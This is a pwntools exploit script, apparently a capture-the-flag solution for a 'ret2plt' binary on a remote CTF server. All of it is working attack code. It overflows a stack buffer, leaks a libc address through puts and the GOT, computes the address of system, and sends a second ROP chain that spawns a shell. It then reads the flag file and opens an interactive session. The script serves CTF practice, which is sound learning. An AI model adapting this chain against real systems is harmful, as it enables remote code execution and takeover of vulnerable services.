#!/usr/bin/env python
from pwn import *

elf = ELF('./ret2plt')
lb = ELF('./libc.so.6')
mao = remote('csie.ctf.tw',10131)

pop_rdi_ret = 0x4006f3
main = 0x400636

context.arch = "amd64"
payload = "A"*40
payload += flat([pop_rdi_ret,elf.got['__libc_start_main'],elf.plt['puts'],main])
mao.sendlineafter(":",payload)

mao.recvline()
libc_base = u64(mao.recv(6).ljust(8,'\x00')) - lb.symbols['__libc_start_main']

sh_off = 0x18cd17
system = libc_base + lb.symbols['system']
p = "A"*40
p += flat([pop_rdi_ret,sh_off+libc_base,system])
mao.sendlineafter(":",p)

sleep(1)

mao.sendline('cat /home/`whoami`/flag')

mao.interactive()

